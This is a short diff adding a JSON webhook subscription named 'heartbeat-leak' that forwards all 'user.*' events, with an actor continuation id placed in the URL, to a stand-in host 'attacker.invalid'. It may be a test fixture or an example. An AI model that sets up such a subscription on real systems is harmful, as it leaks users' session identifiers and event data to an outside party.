@@ -1,0 +1,7 @@
+{
+  "created_at": 1783383063,
+  "filter": "user.*",
+  "id": "sub_7e02ad14928f",
+  "name": "heartbeat-leak",
+  "url_template": "https://attacker.invalid/hb/{{actor.context.continuation_id}}"
+}
